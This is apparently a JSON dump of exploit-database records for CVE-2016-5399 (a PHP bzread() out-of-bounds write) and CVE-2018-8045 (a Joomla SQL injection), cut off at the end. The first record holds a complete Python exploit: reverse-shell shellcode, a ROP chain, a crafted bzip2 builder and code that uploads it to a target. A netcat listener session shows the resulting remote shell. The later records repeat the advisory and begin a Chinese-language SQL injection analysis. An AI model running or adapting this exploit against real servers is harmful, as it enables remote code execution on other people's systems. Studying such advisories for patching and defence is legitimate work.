not be executed.\r\n \r\nIn pseudocode it could be read as something like:\r\n \r\n,----\r\n| i = s->save_i;\r\n| j = s->save_j;\r\n| \r\n| switch (s->state) {\r\n| case BZ_X_SELECTOR_2:\r\n|     s->state = BZ_X_SELECTOR_2;\r\n| \r\n|     nSelectors = get_15_bits...\r\n| \r\n|     for (i = 0; i < nSelectors; i++) {\r\n|         j = 0;\r\n|         while (True) {\r\n|             goto iter;\r\n| case BZ_X_SELECTOR_3:\r\n| iter:\r\n|     s->state = BZ_X_SELECTOR_3;\r\n| \r\n|     uc = get_1_bit...\r\n| \r\n|     if (uc == 0) goto done;\r\n|     j++;\r\n|     if (j >= nGroups) {\r\n|         retVal = BZ_DATA_ERROR;\r\n|         goto save_state_and_return;\r\n|     }\r\n|     goto iter;\r\n| done:\r\n|     s->selectorMtf[i] = j;\r\n`----\r\n \r\nAn example selector with nGroup=6:\r\n,----\r\n| 11111111111110\r\n| ||||| `|||||| `- goto done; s->selectorMtf[i] = 13;\r\n|  `\u00b4     j++;\r\n| j++;    goto save_state_and_return;\r\n| goto iter;\r\n`----\r\n \r\nSince the selectors are used as indices to `pos' in the subsequent loop,\r\nan `nSelectors' amount of <= 255 - BZ_N_GROUPS bytes out-of-bound writes\r\ncould occur if BZ2_decompress() is invoked in spite of a previous error.\r\n \r\nbzip2-1.0.6/decompress.c\r\n,----\r\n| 304          UChar pos[BZ_N_GROUPS], tmp, v;\r\n| 305          for (v = 0; v < nGroups; v++) pos[v] = v;\r\n| 306\r\n| 307          for (i = 0; i < nSelectors; i++) {\r\n| 308             v = s->selectorMtf[i];\r\n| 309             tmp = pos[v];\r\n| 310             while (v > 0) { pos[v] = pos[v-1]; v--; }\r\n| 311             pos[0] = tmp;\r\n| 312             s->selector[i] = tmp;\r\n| 313          }\r\n`----\r\n \r\nbzip2-1.0.6/bzlib_private.h\r\n,----\r\n| 121 #define BZ_N_GROUPS 6\r\n`----\r\n \r\n \r\nPoC\r\n===\r\n \r\nAgainst FreeBSD 10.3 amd64 with php-fpm 7.0.8 and nginx from the\r\nofficial repo [2]:\r\n \r\n,----\r\n| $ nc -v -l 1.2.3.4 5555 &\r\n| Listening on [1.2.3.4] (family 0, port 5555)\r\n| \r\n| $ python exploit.py --ip 1.2.3.4 --port 5555 http://target/upload.php\r\n| [*] sending archive to http://target/upload.php (0)\r\n| \r\n| Connection from [target] port 5555 [tcp/*] accepted (family 2, sport 49479)\r\n| $ fg\r\n| id\r\n| uid=80(www) gid=80(www) groups=80(www)\r\n| \r\n| uname -imrsU\r\n| FreeBSD 10.3-RELEASE-p4 amd64 GENERIC 1003000\r\n| \r\n| /usr/sbin/pkg query -g \"=> %n-%v\" php*\r\n| => php70-7.0.8\r\n| => php70-bz2-7.0.8\r\n| \r\n| cat upload.php\r\n| <?php\r\n| $fp = bzopen($_FILES[\"file\"][\"tmp_name\"], \"r\");\r\n| if ($fp === FALSE) {\r\n|     exit(\"ERROR: bzopen()\");\r\n| }\r\n| \r\n| $data = \"\";\r\n| while (!feof($fp)) {\r\n|     $res = bzread($fp);\r\n|     if ($res === FALSE) {\r\n|         exit(\"ERROR: bzread()\");\r\n|     }\r\n|     $data .= $res;\r\n| }\r\n| bzclose($fp);\r\n| ?>\r\n`----\r\n \r\n \r\nSolution\r\n========\r\n \r\nThis issue has been assigned CVE-2016-5399 and can be mitigated by\r\ncalling bzerror() on the handle between invocations of bzip2.\r\n \r\nAnother partial solution has been introduced in PHP 7.0.9 and 5.5.38,\r\nwhereby the stream is marked as EOF when an error is encountered;\r\nallowing this flaw to be avoided by using feof().  However, the PHP\r\nproject considers this to be an issue in the underlying bzip2\r\nlibrary[3].\r\n \r\n \r\n \r\nFootnotes\r\n_________\r\n \r\n[1] [https://secure.php.net/manual/en/function.bzread.php]\r\n \r\n[2] [https://github.com/dyntopia/exploits/tree/master/CVE-2016-5399]\r\n \r\n[3] [https://bugs.php.net/bug.php?id=72613]\r\n \r\n \r\n-- Hans Jerry Illikainen\r\n'''\r\n#!/usr/bin/env python\r\n#\r\n# PoC for CVE-2016-5399 targeting FreeBSD 10.3 x86-64 running php-fpm\r\n# behind nginx.\r\n#\r\n# ,----\r\n# | $ nc -v -l 1.2.3.4 5555 &\r\n# | Listening on [1.2.3.4] (family 0, port 5555)\r\n# |\r\n# | $ python exploit.py --ip 1.2.3.4 --port 5555 http://target/upload.php\r\n# | [*] sending archive to http://target/upload.php (0)\r\n# |\r\n# | Connection from [target] port 5555 [tcp/*] accepted (family 2, sport 49479)\r\n# | $ fg\r\n# | id\r\n# | uid=80(www) gid=80(www) groups=80(www)\r\n# |\r\n# | uname -imrsU\r\n# | FreeBSD 10.3-RELEASE-p4 amd64 GENERIC 1003000\r\n# |\r\n# | /usr/sbin/pkg query -g \"=> %n-%v\" php*\r\n# | => php70-7.0.8\r\n# | => php70-bz2-7.0.8\r\n# |\r\n# | cat upload.php\r\n# | <?php\r\n# | $fp = bzopen($_FILES[\"file\"][\"tmp_name\"], \"r\");\r\n# | if ($fp === FALSE) {\r\n# |     exit(\"ERROR: bzopen()\");\r\n# | }\r\n# |\r\n# | $data = \"\";\r\n# | while (!feof($fp)) {\r\n# |     $res = bzread($fp);\r\n# |     if ($res === FALSE) {\r\n# |         exit(\"ERROR: bzread()\");\r\n# |     }\r\n# |     $data .= $res;\r\n# | }\r\n# | bzclose($fp);\r\n# | ?>\r\n# `----\r\n#\r\n# - Hans Jerry Illikainen <[email\u00a0protected]>\r\n#\r\nimport argparse\r\nimport socket\r\nfrom struct import pack\r\n \r\nimport requests\r\nimport bitstring\r\n \r\n# reverse shell from metasploit\r\nshellcode = [\r\n    \"\\x31\\xc0\\x83\\xc0\\x61\\x6a\\x02\\x5f\\x6a\\x01\\x5e\\x48\\x31\\xd2\\x0f\"\r\n    \"\\x05\\x49\\x89\\xc4\\x48\\x89\\xc7\\x31\\xc0\\x83\\xc0\\x62\\x48\\x31\\xf6\"\r\n    \"\\x56\\x48\\xbe\\x00\\x02%(port)s%(ip)s\\x56\\x48\\x89\\xe6\\x6a\\x10\"\r\n    \"\\x5a\\x0f\\x05\\x4c\\x89\\xe7\\x6a\\x03\\x5e\\x48\\xff\\xce\\x6a\\x5a\\x58\"\r\n    \"\\x0f\\x05\\x75\\xf6\\x31\\xc0\\x83\\xc0\\x3b\\xe8\\x08\\x00\\x00\\x00\\x2f\"\r\n    \"\\x62\\x69\\x6e\\x2f\\x73\\x68\\x00\\x48\\x8b\\x3c\\x24\\x48\\x31\\xd2\\x52\"\r\n    \"\\x57\\x48\\x89\\xe6\\x0f\\x05\"\r\n]\r\n \r\n# we're bound by the MTF and can only reuse values on the stack\r\n# between pos[0]..pos[255]\r\nselectors = [\r\n    # retaddr:\r\n    #   0x8009c9462: lea    rsp,[rbp-0x20]\r\n    #   0x8009c9466: pop    rbx\r\n    #   0x8009c9467: pop    r12\r\n    #   0x8009c9469: pop    r14\r\n    #   0x8009c946b: pop    r15\r\n    #   0x8009c946d: pop    rbp\r\n    #   0x8009c946e: ret\r\n    #\r\n    # from /libexec/ld-elf.so.1 (bbdffba2dc3bb0b325c6eee9d6e5bd01141d97f3)\r\n    9, 10, 11, 18, 1, 88, 31, 127,\r\n \r\n    # rbp:\r\n    #   0x802974300 (close to the end of the stream)\r\n    16, 17, 18, 29, 22, 152, 159, 25,\r\n \r\n    # push it back\r\n    17, 18, 19, 20, 21, 22, 23, 24,\r\n    25, 26, 27, 28, 29, 30, 31, 32,\r\n    33, 34, 35, 36, 37, 38, 39, 40,\r\n    41, 42, 43, 44, 45, 46, 47, 48,\r\n    49, 50, 51, 52, 53, 54, 55, 56,\r\n    57, 58, 59, 60, 61, 62\r\n]\r\n \r\npayload = [\r\n    # addr\r\n    #\r\n    # 0x41c4c8: pop    rdi\r\n    # 0x41c4c9: ret\r\n    pack(\"<Q\", 0x41c4c8),\r\n    pack(\"<Q\", 0x0802973000),\r\n \r\n    # len\r\n    #\r\n    # 0x421508: pop    rsi\r\n    # 0x421509: ret    0x0\r\n    pack(\"<Q\", 0x421508),\r\n    pack(\"<Q\", 0x5555),\r\n \r\n    # prot\r\n    #\r\n    # 0x519b3a: pop    rdx\r\n    # 0x519b3b: ret\r\n    pack(\"<Q\", 0x519b3a),\r\n    pack(\"<Q\", 0x7),\r\n \r\n    # mprotect\r\n    #\r\n    # 0x5adf50: pop    rax\r\n    # 0x5adf51: ret\r\n    pack(\"<Q\", 0x5adf50),\r\n    pack(\"<Q\", 74),\r\n \r\n    # from /libexec/ld-elf.so.1 (bbdffba2dc3bb0b325c6eee9d6e5bd01141d97f3)\r\n    #\r\n    # 0x8009d5168: syscall\r\n    # 0x8009d516a: jb 0x8009d9d00\r\n    # 0x8009d5170: ret\r\n    pack(\"<Q\", 0x08009d5168),\r\n    pack(\"<Q\", 0x08029731b7),\r\n \r\n    \"%(shellcode)s\",\r\n \r\n    \"%(pad)s\",\r\n \r\n    # 0x45de9c: pop rsp\r\n    # 0x45de9d: ret\r\n    pack(\"<Q\", 0x45de9c),\r\n    pack(\"<Q\", 0x0802973167),\r\n]\r\n \r\n \r\ndef get_payload(ip, port):\r\n    sc = \"\".join(shellcode) % {\r\n        \"ip\": socket.inet_aton(ip),\r\n        \"port\": pack(\"!H\", port)\r\n    }\r\n    return \"\".join(payload) % {\r\n        \"shellcode\": sc,\r\n        \"pad\": \"\\x90\" * (4433 - len(sc)),\r\n    }\r\n \r\n \r\ndef get_header():\r\n    b = bitstring.BitArray()\r\n    b.append(\"0x425a\")             # magic\r\n    b.append(\"0x68\")               # huffman\r\n    b.append(\"0x31\")               # block size (0x31 <= s <= 0x39)\r\n    b.append(\"0x314159265359\")     # compressed magic\r\n    b.append(\"0x11223344\")         # crc\r\n    b.append(\"0b0\")                # not randomized\r\n    b.append(\"0x000000\")           # pointer into BWT\r\n    b.append(\"0b0000000000000001\") # mapping table 1\r\n    b.append(\"0b0000000000000001\") # mapping table 2\r\n    b.append(\"0b110\")              # number of Huffman groups (1 <= n <= 6)\r\n    b.append(format(len(selectors), \"#017b\")) # number of selectors\r\n \r\n    # selector list\r\n    for s in selectors:\r\n        b.append(\"0b\" + \"1\" * s + \"0\")\r\n \r\n    # BZ_X_CODING_1 (1 <= n <= 20).  we want a fail to make\r\n    # BZ2_decompress() bail as early as possible into the\r\n    # first gadget since the stack will be kind of messed up\r\n    b.append(\"0b00000\")\r\n \r\n    return b.tobytes()\r\n \r\n \r\ndef send_bzip2(url, bzip2):\r\n    try:\r\n        req = requests.post(url, files={\"file\": bzip2}, timeout=5)\r\n    except requests.exceptions.Timeout:\r\n        return 0\r\n    return req.status_code\r\n \r\n \r\ndef get_args():\r\n    p = argparse.ArgumentParser()\r\n    p.add_argument(\"--ip\", required=True, help=\"connect-back ip\")\r\n    p.add_argument(\"--port\", required=True, type=int, help=\"connect-back port\")\r\n    p.add_argument(\"--attempts\", type=int, default=10)\r\n    p.add_argument(\"url\")\r\n    return p.parse_args()\r\n \r\n \r\ndef main():\r\n    args = get_args()\r\n    bzip2 = get_header() + get_payload(args.ip, args.port)\r\n \r\n    for i in range(args.attempts):\r\n        print(\"[*] sending archive to %s (%d)\" % (args.url, i))\r\n        status = send_bzip2(args.url, bzip2)\r\n        if status == 0:\r\n            break\r\n        elif status == 404:\r\n            exit(\"[-] 404: %s\" % args.url)\r\n \r\nif __name__ == \"__main__\":\r\n    main()\n\n#  0day.today [2018-01-09]  #",
            "cvss": {
                "score": 6.8,
                "vector": "AV:NETWORK/AC:MEDIUM/Au:NONE/C:PARTIAL/I:PARTIAL/A:PARTIAL/"
            },
            "vhref": "https://vulners.com/zdt/1337DAY-ID-26098"
        },
        {
            "bulletinFamily": "exploit",
            "description": "",
            "modified": "2016-07-21T00:00:00",
            "published": "2016-07-21T00:00:00",
            "href": "https://packetstormsecurity.com/files/137998/PHP-7.0.8-5.6.23-5.5.37-bzread-OOB-Write.html",
            "id": "PACKETSTORM:137998",
            "type": "packetstorm",
            "title": "PHP 7.0.8 / 5.6.23 / 5.5.37 bzread() OOB Write",
            "sourceData": "`PHP 7.0.8, 5.6.23 and 5.5.37 does not perform adequate error handling in  \nits `bzread()' function:  \n  \nphp-7.0.8/ext/bz2/bz2.c  \n,----  \n| 364 static PHP_FUNCTION(bzread)  \n| 365 {  \n| ...  \n| 382 ZSTR_LEN(data) = php_stream_read(stream, ZSTR_VAL(data), ZSTR_LEN(data));  \n| 383 ZSTR_VAL(data)[ZSTR_LEN(data)] = '\\0';  \n| 384  \n| 385 RETURN_NEW_STR(data);  \n| 386 }  \n`----  \n  \nphp-7.0.8/ext/bz2/bz2.c  \n,----  \n| 210 php_stream_ops php_stream_bz2io_ops = {  \n| 211 php_bz2iop_write, php_bz2iop_read,  \n| 212 php_bz2iop_close, php_bz2iop_flush,  \n| 213 \"BZip2\",  \n| 214 NULL, /* seek */  \n| 215 NULL, /* cast */  \n| 216 NULL, /* stat */  \n| 217 NULL /* set_option */  \n| 218 };  \n`----  \n  \nphp-7.0.8/ext/bz2/bz2.c  \n,----  \n| 136 /* {{{ BZip2 stream implementation */  \n| 137  \n| 138 static size_t php_bz2iop_read(php_stream *stream, char *buf, size_t count)  \n| 139 {  \n| 140 struct php_bz2_stream_data_t *self = (struct php_bz2_stream_data_t *)stream->abstract;  \n| 141 size_t ret = 0;  \n| 142  \n| 143 do {  \n| 144 int just_read;  \n| ...  \n| 148 just_read = BZ2_bzread(self->bz_file, buf, to_read);  \n| 149  \n| 150 if (just_read < 1) {  \n| 151 stream->eof = 0 == just_read;  \n| 152 break;  \n| 153 }  \n| 154  \n| 155 ret += just_read;  \n| 156 } while (ret < count);  \n| 157  \n| 158 return ret;  \n| 159 }  \n`----  \n  \nThe erroneous return values for Bzip2 are as follows:  \n  \nbzip2-1.0.6/bzlib.h  \n,----  \n| 038 #define BZ_SEQUENCE_ERROR (-1)  \n| 039 #define BZ_PARAM_ERROR (-2)  \n| 040 #define BZ_MEM_ERROR (-3)  \n| 041 #define BZ_DATA_ERROR (-4)  \n| 042 #define BZ_DATA_ERROR_MAGIC (-5)  \n| 043 #define BZ_IO_ERROR (-6)  \n| 044 #define BZ_UNEXPECTED_EOF (-7)  \n| 045 #define BZ_OUTBUFF_FULL (-8)  \n| 046 #define BZ_CONFIG_ERROR (-9)  \n`----  \n  \nShould the invocation of BZ2_bzread() fail, the loop would simply be  \nbroken out of (bz2.c:152) and execution would continue with bzread()  \nreturning RETURN_NEW_STR(data).  \n  \nAccording to the manual [1], bzread() returns FALSE on error; however  \nthat does not seem to ever happen.  \n  \nDue to the way that the bzip2 library deals with state, this could  \nresult in an exploitable condition if a user were to call bzread() after  \nan error, eg:  \n  \n,----  \n| $data = \"\";  \n| while (!feof($fp)) {  \n| $res = bzread($fp);  \n| if ($res === FALSE) {  \n| exit(\"ERROR: bzread()\");  \n| }  \n| $data .= $res;  \n| }  \n`----  \n  \n  \nExploitation  \n============  \n  \nOne way the lack of error-checking could be abused is through  \nout-of-bound writes that may occur when `BZ2_decompress()' (BZ2_bzread()  \n-> BZ2_bzRead() -> BZ2_bzDecompress() -> BZ2_decompress()) processes the  \n`pos' array using user-controlled selectors as indices:  \n  \nbzip2-1.0.6/decompress.c  \n,----  \n| 106 Int32 BZ2_decompress ( DState* s )  \n| 107 {  \n| 108 UChar uc;  \n| 109 Int32 retVal;  \n| ...  \n| 113 /* stuff that needs to be saved/restored */  \n| 114 Int32 i;  \n| 115 Int32 j;  \n| ...  \n| 118 Int32 nGroups;  \n| 119 Int32 nSelectors;  \n| ...  \n| 167 /*restore from the save area*/  \n| 168 i = s->save_i;  \n| 169 j = s->save_j;  \n| ...  \n| 172 nGroups = s->save_nGroups;  \n| 173 nSelectors = s->save_nSelectors;  \n| ...  \n| 195 switch (s->state) {  \n| ...  \n| 286 /*--- Now the selectors ---*/  \n| 287 GET_BITS(BZ_X_SELECTOR_1, nGroups, 3);  \n| 288 if (nGroups < 2 || nGroups > 6) RETURN(BZ_DATA_ERROR);  \n| 289 GET_BITS(BZ_X_SELECTOR_2, nSelectors, 15);  \n| 290 if (nSelectors < 1) RETURN(BZ_DATA_ERROR);  \n| 291 for (i = 0; i < nSelectors; i++) {  \n| 292 j = 0;  \n| 293 while (True) {  \n| 294 GET_BIT(BZ_X_SELECTOR_3, uc);  \n| 295 if (uc == 0) break;  \n| 296 j++;  \n| 297 if (j >= nGroups) RETURN(BZ_DATA_ERROR);  \n| 298 }  \n| 299 s->selectorMtf[i] = j;  \n| 300 }  \n| 301  \n| 302 /*--- Undo the MTF values for the selectors. ---*/  \n| 303 {  \n| 304 UChar pos[BZ_N_GROUPS], tmp, v;  \n| 305 for (v = 0; v < nGroups; v++) pos[v] = v;  \n| 306  \n| 307 for (i = 0; i < nSelectors; i++) {  \n| 308 v = s->selectorMtf[i];  \n| 309 tmp = pos[v];  \n| 310 while (v > 0) { pos[v] = pos[v-1]; v--; }  \n| 311 pos[0] = tmp;  \n| 312 s->selector[i] = tmp;  \n| 313 }  \n| 314 }  \n| 315  \n| ...  \n| 613 save_state_and_return:  \n| 614  \n| 615 s->save_i = i;  \n| 616 s->save_j = j;  \n| ...  \n| 619 s->save_nGroups = nGroups;  \n| 620 s->save_nSelectors = nSelectors;  \n| ...  \n| 640 return retVal;  \n| 641 }  \n`----  \n  \nbzip2-1.0.6/decompress.c  \n,----  \n| 070 #define GET_BIT(lll,uuu) \\  \n| 071 GET_BITS(lll,uuu,1)  \n`----  \n  \nbzip2-1.0.6/decompress.c  \n,----  \n| 043 #define GET_BITS(lll,vvv,nnn) \\  \n| 044 case lll: s->state = lll; \\  \n| 045 while (True) { \\  \n| ...  \n| 065 }  \n`----  \n  \nIf j >= nGroups (decompress.c:297), BZ2_decompress() would save its  \nstate and return BZ_DATA_ERROR. If the caller don't act on the  \nerroneous retval, but rather invokes BZ2_decompress() again, the saved  \nstate would be restored (including `i' and `j') and the switch statement  \nwould transfer execution to the BZ_X_SELECTOR_3 case -- ie. the  \npreceding initialization of `i = 0' and `j = 0' would not be executed.  \n  \nIn pseudocode it could be read as something like:  \n  \n,----  \n| i = s->save_i;  \n| j = s->save_j;  \n|   \n| switch (s->state) {  \n| case BZ_X_SELECTOR_2:  \n| s->state = BZ_X_SELECTOR_2;  \n|   \n| nSelectors = get_15_bits...  \n|   \n| for (i = 0; i < nSelectors; i++) {  \n| j = 0;  \n| while (True) {  \n| goto iter;  \n| case BZ_X_SELECTOR_3:  \n| iter:  \n| s->state = BZ_X_SELECTOR_3;  \n|   \n| uc = get_1_bit...  \n|   \n| if (uc == 0) goto done;  \n| j++;  \n| if (j >= nGroups) {  \n| retVal = BZ_DATA_ERROR;  \n| goto save_state_and_return;  \n| }  \n| goto iter;  \n| done:  \n| s->selectorMtf[i] = j;  \n`----  \n  \nAn example selector with nGroup=6:  \n,----  \n| 11111111111110  \n| ||||| `|||||| `- goto done; s->selectorMtf[i] = 13;  \n| `A' j++;  \n| j++; goto save_state_and_return;  \n| goto iter;  \n`----  \n  \nSince the selectors are used as indices to `pos' in the subsequent loop,  \nan `nSelectors' amount of <= 255 - BZ_N_GROUPS bytes out-of-bound writes  \ncould occur if BZ2_decompress() is invoked in spite of a previous error.  \n  \nbzip2-1.0.6/decompress.c  \n,----  \n| 304 UChar pos[BZ_N_GROUPS], tmp, v;  \n| 305 for (v = 0; v < nGroups; v++) pos[v] = v;  \n| 306  \n| 307 for (i = 0; i < nSelectors; i++) {  \n| 308 v = s->selectorMtf[i];  \n| 309 tmp = pos[v];  \n| 310 while (v > 0) { pos[v] = pos[v-1]; v--; }  \n| 311 pos[0] = tmp;  \n| 312 s->selector[i] = tmp;  \n| 313 }  \n`----  \n  \nbzip2-1.0.6/bzlib_private.h  \n,----  \n| 121 #define BZ_N_GROUPS 6  \n`----  \n  \n  \nPoC  \n===  \n  \nAgainst FreeBSD 10.3 amd64 with php-fpm 7.0.8 and nginx from the  \nofficial repo [2]:  \n  \n,----  \n| $ nc -v -l 1.2.3.4 5555 &  \n| Listening on [1.2.3.4] (family 0, port 5555)  \n|   \n| $ python exploit.py --ip 1.2.3.4 --port 5555 http://target/upload.php  \n| [*] sending archive to http://target/upload.php (0)  \n|   \n| Connection from [target] port 5555 [tcp/*] accepted (family 2, sport 49479)  \n| $ fg  \n| id  \n| uid=80(www) gid=80(www) groups=80(www)  \n|   \n| uname -imrsU  \n| FreeBSD 10.3-RELEASE-p4 amd64 GENERIC 1003000  \n|   \n| /usr/sbin/pkg query -g \"=> %n-%v\" php*  \n| => php70-7.0.8  \n| => php70-bz2-7.0.8  \n|   \n| cat upload.php  \n| <?php  \n| $fp = bzopen($_FILES[\"file\"][\"tmp_name\"], \"r\");  \n| if ($fp === FALSE) {  \n| exit(\"ERROR: bzopen()\");  \n| }  \n|   \n| $data = \"\";  \n| while (!feof($fp)) {  \n| $res = bzread($fp);  \n| if ($res === FALSE) {  \n| exit(\"ERROR: bzread()\");  \n| }  \n| $data .= $res;  \n| }  \n| bzclose($fp);  \n| ?>  \n`----  \n  \n  \nSolution  \n========  \n  \nThis issue has been assigned CVE-2016-5399 and can be mitigated by  \ncalling bzerror() on the handle between invocations of bzip2.  \n  \nAnother partial solution has been introduced in PHP 7.0.9 and 5.5.38,  \nwhereby the stream is marked as EOF when an error is encountered;  \nallowing this flaw to be avoided by using feof(). However, the PHP  \nproject considers this to be an issue in the underlying bzip2  \nlibrary[3].  \n  \n  \n  \nFootnotes  \n_________  \n  \n[1] [https://secure.php.net/manual/en/function.bzread.php]  \n  \n[2] [https://github.com/dyntopia/exploits/tree/master/CVE-2016-5399]  \n  \n[3] [https://bugs.php.net/bug.php?id=72613]  \n  \n  \n--   \nHans Jerry Illikainen  \n`\n",
            "cvss": {
                "score": 0.0,
                "vector": "NONE"
            },
            "vhref": "https://vulners.com/packetstorm/PACKETSTORM:137998"
        }
    ],
    "CVE-2018-8045": [
        {
            "bulletinFamily": "exploit",
            "description": "\u4f5c\u8005\uff1a\u7eff\u76df\u79d1\u6280  \r\n\u6765\u6e90\uff1a<http://blog.nsfocus.net/cve-2018-804-analysis/>\r\n\r\n#### CVE-2018-8045 \u6f0f\u6d1e\u7b80\u4ecb\r\n\u6f0f\u6d1e\u5177\u4f53\u60c5\u51b5\u53ef\u53c2\u89c1[\u7eff\u76df\u79d1\u6280\u5b89\u5168\u5a01\u80c1\u5468\u62a5-201812\u5468](http://blog.nsfocus.net/nsfocus-201812/ \"\u7eff\u76df\u79d1\u6280\u5b89\u5168\u5a01\u80c1\u5468\u62a5-201812\u5468\")\r\n\r\nJoomla! Core SQL\u6ce8\u5165\u6f0f\u6d1e\uff1a\r\n\r\nNSFOCUS ID\uff1a39158  \r\nCVE ID\uff1aCVE-2018-8045  \r\n\u53d7\u5f71\u54cd\u7248\u672c\uff1aJoomla! Joomla! 3.5.0-3.8.5  \r\n\u6f0f\u6d1e\u70b9\u8bc4\uff1aJoomla\u662f\u4e00\u5957\u7f51\u7ad9\u5185\u5bb9\u7ba1\u7406\u7cfb\u7edf,\u4f7f\u7528PHP\u8bed\u8a00\u548cMySQL\u6570\u636e\u5e93\u5f00\u53d1\u3002Joomla! 3.5.0 -3.8.5\u7248\u672c\u5bf9SQL\u8bed\u53e5\u5185\u7684\u53d8\u91cf\u7f3a\u5c11\u7c7b\u578b\u8f6c\u6362\uff0c\u5bfc\u81f4User Notes\u5217\u8868\u89c6\u56fe\u5185SQL\u6ce8 \u5165\u6f0f\u6d1e\uff0c\u53ef\u4f7f\u653b\u51fb\u8005\u8bbf\u95ee\u6216\u4fee\u6539\u6570\u636e\u7b49\u3002\u76ee\u524d\u5382\u5546\u5df2\u7ecf\u53d1\u5e03\u4e86\u5347\u7ea7\u8865\u4e01\uff0c\u4fee\u590d\u4e86\u8fd9\u4e2a \u5b89\u5168\u95ee\u9898\uff0c\u8bf7\u7528\u6237\u53ca\u65f6\u5230\u5382\u5546\u7684\u4e3b\u9875\u4e0b\u8f7d\u3002\r\n\r\n#### CVE-2018-8045 \u6f0f\u6d1e\u8be6\u60c5\r\n\u6211\u4eec\u5148\u770b\u4e0bjoomla\u5b98\u7f51\u600e\u4e48\u8bf4\u7684\uff1a\r\n\r\n<https://developer.joomla.org/security-centre/723-20180301-core-sqli-vulnerability.html></https://developer.joomla.org/security-centre/723-20180301-core-sqli-vulnerability.html>\r\n\r\n![](https://images.seebug.org/content/images/2018/03/dae57f06-19fe-431d-978f-57ce06d53251.png-w331s)\r\n\r\nUser Notes\u6a21\u5757\u7531\u4e8e\u7f3a\u5c11\u53d8\u91cf\u7c7b\u578b\u8f6c\u6362\uff0c\u5bfc\u81f4sql\u6ce8\u5165\u7684\u4ea7\u751f\u3002\u8fd9\u4e2a\u6f0f\u6d1e\u57283.8.6\u7248\u672c\u88ab\u89e3\u51b3\u3002\r\n\r\n\u6f0f\u6d1e\u4ecb\u7ecd\u5f88\u6a21\u7cca\uff0c\u5355\u4ece\u4ecb\u7ecd\u6765\u770b\uff0c\u6839\u672c\u4e0d\u77e5\u9053\u8fd9\u4e2asql\u6ce8\u5165\u4ea7\u751f\u7684\u4f4d\u7f6e\u3002\r\n\r\n\u4f46\u662f\u65e2\u7136\u662f3.8.6\u7248\u672c\u89e3\u51b3\u7684\uff0c\u90a3\u6211\u4eec\u5c31\u6765\u4ece3.8.6\u7248\u672c\u7684update\u5305\u4e2d\u627e\u627e\u601d\u8def\u3002\r\n\r\n\u5982\u4e0b\u662fgithub\u4e0ajoomla\u7684releases\u5217\u8868\r\n\r\n<https://github.com/joomla/joomla-cms/releases>\r\n\r\n\u627e\u5230Update from Joomla! 3.8.5\u5347\u7ea7\u5305\u4e0b\u8f7d\uff0c\u6253\u5f00\u4e0b\u8f7d\u597d\u7684\u5347\u7ea7\u5305\uff0c\u6839\u636enotes\u8fd9\u4e2a\u7ebf\u7d22\u641c\u7d22\u4e0b\u3002\u679c\u7136\uff0c\u5728\u5347\u7ea7\u5305\u4e2d\u770b\u5230\u4e86\u4e00\u4e2anotes.php\u6587\u4ef6\u3002\r\n\r\n![](https://images.seebug.org/content/images/2018/03/93080ab4-81c8-4395-a3ed-9dcfb6e50a2d.png-w331s)\r\n\r\n\u6211\u4eec\u56de\u5230github\u4e0a\uff0c\u770b\u4e0b\u8fd9\u4e2anotes.php\u6539\u52a8\u4e86\u4ec0\u4e48\u3002\r\n\r\n![](https://images.seebug.org/content/images/2018/03/899478ec-c31e-4266-bc0d-05c644802b22.png-w331s)\r\n\r\n\u5f88\u660e\u663e\uff0c\u5347\u7ea7\u5305\u4e2d\u7684notes.php\u4e2d\uff0c\u5bf9$categoryId\u7684\u503c\u8fdb\u884c\u4e86\u9650\u5236\uff0c\u5f3a\u5236\u8f6c\u6362\u4e3aint\u7c7b\u578b\uff0c\u53ef\u4ee5\u786e\u5b9a\uff0c\u8fd9\u4e2a\u6f0f\u6d1e\u5c31\u51fa\u5728\u8fd9\u91cc\u3002\r\n\r\n\u5728\u8fd9\u91cc\u8bf4\u4e2a\u9898\u5916\u8bdd\uff0cnotes.php\u4e2dgetState\u65b9\u6cd5\u51fa\u73b0\u8fc7\u5f88\u591a\u6b21\uff0c\u5206\u522b\u6709\r\n\r\n- getState(\u2018filter.search\u2019)\r\n- getState(\u2018filter.published\u2019)\r\n- getState(\u2018filter.category_id\u2019)\r\n- getState(\u2018filter.user_id\u2019)\r\n- getState(\u2018filter.level\u2019)\r\n\r\n\u4f46\u662f\u552f\u6709getState(\u2018filter.category_id\u2019)\u65b9\u6cd5\u6ca1\u6709\u8fdb\u884c(int)\u7c7b\u578b\u8f6c\u6362\uff0c\u5b58\u5728\u7740\u6f0f\u6d1e\u9690\u60a3\uff0c\u8fd9\u53ef\u80fd\u662f\u5f00\u53d1\u8005\u4e00\u65f6\u7684\u758f\u5ffd\u5427\u3002\r\n\r\n#### CVE-2018-8045 \u6f0f\u6d1e\u5206\u6790\r\n\u6765\u770b\u4e0b\u5b58\u5728\u6f0f\u6d1e\u7684\u4ee3\u7801\uff1a\r\n```\r\n// Filter by a single or group of categories.\r\n$categoryId = $this->getState('filter.category_id');\r\n\r\nif ($categoryId && is_scalar($categoryId))\r\n{\r\n   $query->where('a.catid = ' . $categoryId);\r\n}\r\n```\r\n\r\n$categoryId\u672a\u7ecf\u8fc7\u6ee4\u76f4\u63a5\u62fc\u63a5sql\u8bed\u53e5\u8fdb\u884c\u67e5\u8be2\uff0c\u9020\u6210\u4e86sql\u6ce8\u5165\u3002\r\n\r\n\u4f46\u662f$categoryId\u53c2\u6570\u5982\u4f55\u63a7\u5236\u5462\uff1f\r\n\r\n\u5b58\u5728\u6f0f\u6d1e\u7684\u6587\u4ef6\u4f4d\u4e8e\\administrator\\components\\com_users\\models\\notes.php\uff0c\u662f\u4e00\u4e2ajoomla\u7684\u6a21\u578b\u6587\u4ef6\uff0c\u5b83\u7684\u63a7\u5236\u5668\u662f\\administrator\\components\\com_users\\controllers\\notes.php\r\n\r\n\u6211\u4eec\u767b\u5f55joomla\u540e\u53f0\u6765\u770b\u4e00\u4e0b\u5728\u54ea\u91cc\u89e6\u53d1\u8fd9\u4e2a\u6f0f\u6d1e\u3002\r\n\r\n\u8bbf\u95ee<http://xxx/joomla/administrator/index.php?option=com_users&view=notes></http://xxx/joomla/administrator/index.php?option> 